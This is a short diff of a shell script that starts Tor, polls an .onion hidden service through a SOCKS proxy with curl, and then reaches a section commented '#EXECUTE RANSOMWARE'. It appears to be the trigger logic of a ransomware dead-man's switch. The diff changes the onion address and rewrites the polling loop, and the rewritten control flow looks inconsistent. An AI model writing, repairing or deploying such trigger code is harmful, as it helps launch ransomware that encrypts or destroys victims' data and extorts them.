@@ -11,25 +11,24 @@ service tor start
 
 
 #VARIABLES
-TOR_URL="62uxh4sdczcyr6tkndwy5mvr3xjhmobruq5vxymtzusddcew6deem2ad.onion"
+TOR_URL="lxu7zbrvwbo7ogy7u7yzy65yld2rdgjfcwgoyrkejedqoefboeejspid.onion"
 TOR_PROXY="localhost:9050"
-CURL_CMD="curl -s --socks5-hostname"
-CURL_RETURN_CODE=0
-
+CURL_CMD="curl -I -s --socks5-hostname"
+CURL_STAT=0
 
 #COMMAND TO CHECK SERVER
-CURL_OUTPUT=`${CURL_CMD} ${TOR_PROXY} ${TOR_URL} 2> /dev/null` || CURL_RETURN_CODE=$?
-echo "${CURL_OUTPUT}"
-
+CURL_OUTPUT=$(${CURL_CMD} ${TOR_PROXY} ${TOR_URL})
 
 #LOOP TO CHECK IF SERVER UP
-while  [ ${CURL_RETURN_CODE} -eq 0 ]
+while [ ${CURL_STAT} -eq 0 ]
 do
-	echo "curl connection okey"
-	CURL_OUTPUT=`${CURL_CMD} ${TOR_PROXY} ${TOR_URL} 2> /dev/null` || CURL_RETURN_CODE=$?
-
+    if echo "$CURL_OUTPUT" | grep -q "200"; then
+        break
+    else
+    	sleep 60    
+    	CURL_OUTPUT=$(${CURL_CMD} ${TOR_PROXY} ${TOR_URL})
+    fi
 done
-
 
 #EXECUTE RANSOMWARE
 echo "curl connection fail"
